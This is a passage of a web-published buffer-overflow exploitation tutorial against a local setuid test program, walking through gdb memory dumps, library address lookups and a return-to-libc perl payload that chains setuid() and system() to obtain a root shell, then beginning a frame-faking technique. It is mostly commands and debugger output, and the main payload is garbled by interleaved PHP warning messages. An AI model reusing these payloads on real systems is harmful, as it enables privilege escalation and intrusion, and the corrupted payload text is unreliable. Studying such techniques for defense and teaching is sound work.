br/>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin<br/>MAIL=/var/spool/mail/root<br/>PWD=/home/vangelis/test/bof<br/>INPUTRC=/etc/inputrc<br/>XMODIFIERS=@im=Ami<br/>LANG=ko_KR.eucKR<br/>GDMSESSION=Default<br/>SSH_ASKPASS=/usr/libexec/openssh/gnome-ssh-askpass<br/>SHLVL=3<br/>HOME=/home/vangelis<br/>GNOME_DESKTOP_SESSION_ID=Default<br/>BASH_ENV=/root/.bashrc<br/>LOGNAME=vangelis<br/>LESSOPEN=|/usr/bin/lesspipe.sh&nbsp;%s<br/>DISPLAY=:0<br/>G_BROKEN_FILENAMES=1<br/>XAUTHORITY=/home/vangelis/.xauthct1pxK<br/>COLORTERM=gnome-terminal<br/>_=/bin/env<br/>[vangelis@localhost&nbsp;bof]$<br/><br/><br/>The&nbsp;first&nbsp;list&nbsp;of&nbsp;environment&nbsp;variables&nbsp;is&nbsp;"SSH_AGENT_PID=955".&nbsp;<br/>Now&nbsp;I&nbsp;will&nbsp;add&nbsp;"/bin/sh"&nbsp;to&nbsp;it&nbsp;by&nbsp;using&nbsp;export.&nbsp;<br/><br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;export&nbsp;SSH_AGENT_PID="955;/bin/sh"<br/>[vangelis@localhost&nbsp;bof]$&nbsp;env<br/>SSH_AGENT_PID=955;/bin/sh<br/>HOSTNAME=localhost.localdomain<br/>PVM_RSH=/usr/bin/rsh<br/>TERM=xterm<br/>SHELL=/bin/bash<br/>HISTSIZE=1000<br/>JLESSCHARSET=ko<br/>GTK_RC_FILES=/etc/gtk/gtkrc:/root/.gtkrc-1.2-gnome2<br/>WINDOWID=23068815<br/>QTDIR=/usr/lib/qt3-gcc3.2<br/>USER=vangelis<br/>LS_COLORS=no=00:fi=00:di=00;34:ln=00;36:pi=40;33:so=00;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:&nbsp;[etc...]<br/>SSH_AUTH_SOCK=/tmp/ssh-XXRxCKJr/agent.897<br/>PVM_ROOT=/usr/share/pvm3<br/>USERNAME=root<br/>SESSION_MANAGER=local/localhost.localdomain:/tmp/.ICE-unix/897<br/>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin<br/>MAIL=/var/spool/mail/root<br/>PWD=/home/vangelis/test/bof<br/>INPUTRC=/etc/inputrc<br/>XMODIFIERS=@im=Ami<br/>LANG=ko_KR.eucKR<br/>GDMSESSION=Default<br/>SSH_ASKPASS=/usr/libexec/openssh/gnome-ssh-askpass<br/>SHLVL=3<br/>HOME=/home/vangelis<br/>GNOME_DESKTOP_SESSION_ID=Default<br/>BASH_ENV=/root/.bashrc<br/>LOGNAME=vangelis<br/>LESSOPEN=|/usr/bin/lesspipe.sh&nbsp;%s<br/>DISPLAY=:0<br/>G_BROKEN_FILENAMES=1<br/>XAUTHORITY=/home/vangelis/.xauthzRzRr8<br/>COLORTERM=gnome-terminal<br/>_=/bin/env<br/>[vangelis@localhost&nbsp;bof]$<br/><br/>To&nbsp;make&nbsp;you&nbsp;understand&nbsp;the&nbsp;reason&nbsp;why&nbsp;I&nbsp;add&nbsp;"/bin/sh"&nbsp;to&nbsp;the&nbsp;first&nbsp;list,&nbsp;I&nbsp;will&nbsp;dump&nbsp;the&nbsp;contents&nbsp;of&nbsp;memory.&nbsp;&nbsp;<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;vul2<br/>(gdb)&nbsp;b&nbsp;main<br/>Breakpoint&nbsp;1&nbsp;at&nbsp;0x804832e<br/>(gdb)&nbsp;r<br/>Starting&nbsp;program:&nbsp;/home/vangelis/test/bof/vul2<br/>/bin/bash:&nbsp;/root/.bashrc:&nbsp;permission&nbsp;denied<br/>Breakpoint&nbsp;1,&nbsp;0x0804832e&nbsp;in&nbsp;main&nbsp;()<br/>(gdb)&nbsp;x/50x&nbsp;$ebp<br/>0xbffff908:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff928&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x420158d4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff954<br/>0xbffff918:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff95c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x400124b8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048278<br/>0xbffff928:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048299&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048328&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001<br/>0xbffff938:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff954&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048230&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0804837c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x4000a950<br/>0xbffff948:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff94c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x4001020c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffa77<br/>0xbffff958:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffa94&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffaae&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffacd<br/>0xbffff968:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffae2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffaf2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffafd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffb0d<br/>0xbffff978:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffb1b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffb4f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffb61&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffb7b<br/>0xbffff988:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffb89&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffd4c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffd65&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffd8f<br/>0xbffff998:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffdce&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffddc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffdf6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffe51<br/>0xbffff9a8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffe5d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffe72&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffe8e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffea1<br/>0xbffff9b8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffeb2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffec5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffef8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbfffff0c<br/>0xbffff9c8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbfffff14&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbfffff35<br/>(gdb)&nbsp;x/8wx&nbsp;0xbffff954<br/>0xbffff954:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffa77&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffa94&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffaae<br/>0xbffff964:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffacd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffae2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffaf2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffafd<br/>(gdb)&nbsp;x/s&nbsp;0xbffffa77<br/>0xbffffa77:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"/home/vangelis/test/bof/vul2"<br/>(gdb)&nbsp;x/8wx&nbsp;0xbffff95c<br/>0xbffff95c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffa94&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffaae&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffacd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffae2<br/>0xbffff96c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffaf2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffafd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffb0d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffb1b<br/>(gdb)&nbsp;x/s&nbsp;0xbffffa94<br/>0xbffffa94:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"SSH_AGENT_PID=955;/bin/sh"<br/>(gdb)&nbsp;x/s&nbsp;0xbffffaae<br/>0xbffffaae:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"HOSTNAME=localhost.localdomain"<br/>(gdb)&nbsp;x/s&nbsp;0xbffffacd<br/>0xbffffacd:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"PVM_RSH=/usr/bin/rsh"<br/>(gdb)&nbsp;q<br/>The&nbsp;program&nbsp;is&nbsp;running.&nbsp;&nbsp;Exit&nbsp;anyway?&nbsp;(y&nbsp;or&nbsp;n)&nbsp;y<br/>[vangelis@localhost&nbsp;bof]$<br/><br/><br/>As&nbsp;you&nbsp;can&nbsp;see,&nbsp;*env[0]&nbsp;is&nbsp;at&nbsp;0xbffffa94&nbsp;of&nbsp;6th&nbsp;line.&nbsp;Let's&nbsp;check&nbsp;from&nbsp;the&nbsp;1st&nbsp;line&nbsp;to&nbsp;the&nbsp;6th&nbsp;line.<br/><br/><br/>0xbffff908:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff928&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x420158d4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff954<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(**argv)<br/><br/>0xbffff918:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff95c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x400124b8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048278<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(**env)<br/><br/>0xbffff928:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048299&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048328&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001<br/>0xbffff938:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff954&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048230&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0804837c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x4000a950<br/>0xbffff948:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff94c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x4001020c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffa77<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(argc)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*argv[0])<br/><br/>0xbffff958:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffa94&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffaae&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffacd<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(null)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*env[0])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*env[1])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*env[2])<br/><br/><br/><br/><br/>We&nbsp;added&nbsp;"/bin/sh"&nbsp;to&nbsp;env[0],&nbsp;so&nbsp;we&nbsp;can&nbsp;get&nbsp;a&nbsp;shell&nbsp;if&nbsp;we&nbsp;overwrite&nbsp;the&nbsp;<br/>address&nbsp;of&nbsp;system()&nbsp;before&nbsp;null&nbsp;of&nbsp;the&nbsp;6th&nbsp;line.&nbsp;And&nbsp;we&nbsp;get&nbsp;a&nbsp;root&nbsp;shell<br/>if&nbsp;we&nbsp;overwrite&nbsp;the&nbsp;address&nbsp;of&nbsp;setuid()&nbsp;before&nbsp;system().&nbsp;The&nbsp;null&nbsp;will&nbsp;<br/>be&nbsp;used&nbsp;as&nbsp;an&nbsp;argument&nbsp;of&nbsp;setuid(),&nbsp;so&nbsp;the&nbsp;root&nbsp;privilege&nbsp;won't&nbsp;be&nbsp;dropped.<br/><br/>Now&nbsp;I&nbsp;will&nbsp;suggest&nbsp;the&nbsp;attack&nbsp;payload:<br/><br/>-----------------------------------------------------------------------<br/>|&nbsp;data&nbsp;to&nbsp;overflow&nbsp;|&nbsp;"ret"&nbsp;of&nbsp;printf()&nbsp;x&nbsp;18&nbsp;|&nbsp;*setuid()&nbsp;|&nbsp;*system()&nbsp;|<br/>-----------------------------------------------------------------------&nbsp;<br/><br/>In&nbsp;above&nbsp;payload,&nbsp;we&nbsp;must&nbsp;put&nbsp;'x18'&nbsp;because&nbsp;we&nbsp;have&nbsp;to&nbsp;consider&nbsp;the&nbsp;<br/>distance&nbsp;from&nbsp;**env&nbsp;to&nbsp;*env[0].&nbsp;<br/><br/>Now,&nbsp;let's&nbsp;find&nbsp;out&nbsp;the&nbsp;addresses&nbsp;of&nbsp;setuid(),&nbsp;system(),&nbsp;and&nbsp;ret&nbsp;of&nbsp;printf().<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;vul2<br/>(gdb)&nbsp;b&nbsp;main<br/>Breakpoint&nbsp;1&nbsp;at&nbsp;0x804832e<br/>(gdb)&nbsp;r<br/>Starting&nbsp;program:&nbsp;/home/vangelis/test/bof/vul2<br/><br/>/bin/bash:&nbsp;/root/.bashrc:&nbsp;permission&nbsp;denied<br/>Breakpoint&nbsp;1,&nbsp;0x0804832e&nbsp;in&nbsp;main&nbsp;()<br/>(gdb)&nbsp;x/i&nbsp;setuid<br/><br/>0x420aefe0&nbsp;&lt;setuid&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>(gdb)&nbsp;x/i&nbsp;system<br/>0x42041e50&nbsp;&lt;system&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>(gdb)&nbsp;disas&nbsp;printf<br/>Dump&nbsp;of&nbsp;assembler&nbsp;code&nbsp;for&nbsp;function&nbsp;printf:<br/>0x42052390&nbsp;&lt;printf&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>0x42052391&nbsp;&lt;printf+1&gt;:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ebp<br/>0x42052393&nbsp;&lt;printf+3&gt;:&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x18,%esp<br/>0x42052396&nbsp;&lt;printf+6&gt;:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%ebx,0xfffffffc(%ebp)<br/>0x42052399&nbsp;&lt;printf+9&gt;:&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;0xc(%ebp),%ecx<br/>0x4205239c&nbsp;&lt;printf+12&gt;:&nbsp;call&nbsp;&nbsp;&nbsp;0x4201575d&nbsp;&lt;__i686.get_pc_thunk.bx&gt;<br/>0x420523a1&nbsp;&lt;printf+17&gt;:&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0xd7f2f,%ebx<br/>0x420523a7&nbsp;&lt;printf+23&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0x17c(%ebx),%eax<br/>0x420523ad&nbsp;&lt;printf+29&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;(%eax),%eax<br/>0x420523af&nbsp;&lt;printf+31&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%ecx,0x8(%esp,1)<br/>0x420523b3&nbsp;&lt;printf+35&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%eax,(%esp,1)<br/>0x420523b6&nbsp;&lt;printf+38&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0x8(%ebp),%eax<br/>0x420523b9&nbsp;&lt;printf+41&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%eax,0x4(%esp,1)<br/>0x420523bd&nbsp;&lt;printf+45&gt;:&nbsp;call&nbsp;&nbsp;&nbsp;0x42047f00&nbsp;&lt;vfprintf&gt;<br/>0x420523c2&nbsp;&lt;printf+50&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0xfffffffc(%ebp),%ebx<br/>0x420523c5&nbsp;&lt;printf+53&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%ebp,%esp<br/>0x420523c7&nbsp;&lt;printf+55&gt;:&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;%ebp<br/>0x420523c8&nbsp;&lt;printf+56&gt;:&nbsp;ret&nbsp;&nbsp;<br/>0x420523c9&nbsp;&lt;printf+57&gt;:&nbsp;nop<br/>0x420523ca&nbsp;&lt;printf+58&gt;:&nbsp;nop<br/>0x420523cb&nbsp;&lt;printf+59&gt;:&nbsp;nop<br/>0x420523cc&nbsp;&lt;printf+60&gt;:&nbsp;nop<br/>0x420523cd&nbsp;&lt;printf+61&gt;:&nbsp;nop<br/>0x420523ce&nbsp;&lt;printf+62&gt;:&nbsp;nop<br/>0x420523cf&nbsp;&lt;printf+63&gt;:&nbsp;nop<br/>End&nbsp;of&nbsp;assembler&nbsp;dump.<br/>(gdb)&nbsp;q<br/>The&nbsp;program&nbsp;is&nbsp;running.&nbsp;&nbsp;Exit&nbsp;anyway?&nbsp;(y&nbsp;or&nbsp;n)&nbsp;y<br/>[vangelis@localhost&nbsp;bof]$<br/><br/>Now,&nbsp;we&nbsp;get&nbsp;all&nbsp;information&nbsp;to&nbsp;exploit.&nbsp;<br/><br/>*system():&nbsp;0x42041e50<br/>*setuid():&nbsp;0x420aefe0&nbsp;<br/>*ret&nbsp;of&nbsp;printf():&nbsp;0x420523c8<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul2&nbsp;"`perl&nbsp;-e&nbsp;'print&nbsp;"A"x28,"<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
xc8<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x23<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x05<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x42"x18,"<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
xe0<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
xef<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x0a<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x42","<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x50<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x1e<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x04<br/>
<b>Warning</b>:  Unexpected character in input:  '\' (ASCII=92) state=1 in <b>/home/neworder/site/functions.php</b> on line <b>524</b><br/>
x42"'`"<br/>sh-2.05b#<br/><br/>In&nbsp;above&nbsp;attack&nbsp;string,&nbsp;I&nbsp;put&nbsp;"&nbsp;"&nbsp;in&nbsp;both&nbsp;end.&nbsp;This&nbsp;is&nbsp;because&nbsp;there&nbsp;<br/>is&nbsp;"\x0a".&nbsp;If&nbsp;there&nbsp;is&nbsp;"\x0a"&nbsp;in&nbsp;the&nbsp;payload,&nbsp;the&nbsp;rest&nbsp;part&nbsp;of&nbsp;payload<br/>after&nbsp;"\x0a"will&nbsp;not&nbsp;be&nbsp;passed&nbsp;as&nbsp;arguments.&nbsp;So&nbsp;I&nbsp;put&nbsp;"&nbsp;"&nbsp;in&nbsp;both&nbsp;ends&nbsp;<br/>to&nbsp;pass&nbsp;the&nbsp;rest&nbsp;part&nbsp;of&nbsp;arguments.<br/><br/><br/><br/><br/>3.3.&nbsp;Frame&nbsp;Faking<br/><br/>This&nbsp;technique&nbsp;is&nbsp;well&nbsp;described&nbsp;in&nbsp;Nergal's&nbsp;article&nbsp;and&nbsp;other&nbsp;related&nbsp;ones.<br/>I&nbsp;wish&nbsp;you&nbsp;to&nbsp;read&nbsp;the&nbsp;articles.&nbsp;The&nbsp;attack&nbsp;payload&nbsp;is&nbsp;like&nbsp;this:<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;------------------------------------------------------<br/>&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;data&nbsp;to&nbsp;overflow&nbsp;buffer&nbsp;&nbsp;|&nbsp;&nbsp;fake_ebp0&nbsp;&nbsp;|&nbsp;&nbsp;leaveret&nbsp;|<br/>&nbsp;&nbsp;&nbsp;&nbsp;------------------------------------------------------<br/><br/>It&nbsp;is&nbsp;quite&nbsp;easy&nbsp;to&nbsp;find&nbsp;out&nbsp;how&nbsp;many&nbsp;data&nbsp;we&nbsp;need&nbsp;to&nbsp;overflow&nbsp;buffer.&nbsp;We&nbsp;can<br/>use&nbsp;gdb&nbsp;for&nbsp;it&nbsp;as&nbsp;we&nbsp;have&nbsp;seen.&nbsp;fake_ebp0&nbsp;is&nbsp;the&nbsp;starting&nbsp;address&nbsp;of&nbsp;buffer.&nbsp;<br/>I&nbsp;found&nbsp;that&nbsp;if&nbsp;we&nbsp;use&nbsp;eggshell&nbsp;we&nbsp;don't&nbsp;need&nbsp;the&nbsp;exact&nbsp;fake_ebp0.&nbsp;We&nbsp;can&nbsp;use&nbsp;<br/>from&nbsp;0xbffff201&nbsp;to&nbsp;0xbffff908&nbsp;for&nbsp;fake_ebp0,&nbsp;so&nbsp;we&nbsp;can&nbsp;have&nbsp;more&nbsp;chances.&nbsp;It&nbsp;<br/>is&nbsp;sure&nbsp;that&nbsp;there&nbsp;may&nbsp;be&nbsp;differences&nbsp;among&nbsp;systems.&nbsp;Anyway,&nbsp;if&nbsp;we&nbsp;don't&nbsp;use&nbsp;<br/>eggshell,&nbsp;we&nbsp;need&nbsp;the&nbsp;exact&nbsp;fake_ebp0.&nbsp;So,&nbsp;I&nbsp;will&nbsp;use&nbsp;eggshell&nbsp;for&nbsp;convenience.<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;./eggshell<br/>Using&nbsp;address:&nbsp;0xbffff8d8<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;vul2<br/>(gdb)&nbsp;disas&nbsp;main<br/>Dump&nbsp;of&nbsp;assembler&nbsp;code&nbsp;for&nbsp;function&nbsp;main:<br/>0x8048328&nbsp;&lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>0x8048329&nbsp;&lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ebp<br/>0x804832b&nbsp;&lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x18,%esp&nbsp;&nbsp;<br/>0x804832e&nbsp;&lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;$0xfffffff0,%esp<br/>0x8048331&nbsp;&lt;main+9&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048336&nbsp;&lt;main+14&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;%eax,%esp<br/>0x8048338&nbsp;&lt;main+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x8,%esp<br/>0x804833b&nbsp;&lt;main+19&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0xc(%ebp),%eax<br/>0x804833e&nbsp;&lt;main+22&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x4,%eax<br/>0x8048341&nbsp;&lt;main+25&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pushl&nbsp;&nbsp;(%eax)<br/>0x8048343&nbsp;&lt;main+27&gt;:&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;0xffffffe8(%ebp),%eax<br/>0x8048346&nbsp;&lt;main+30&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;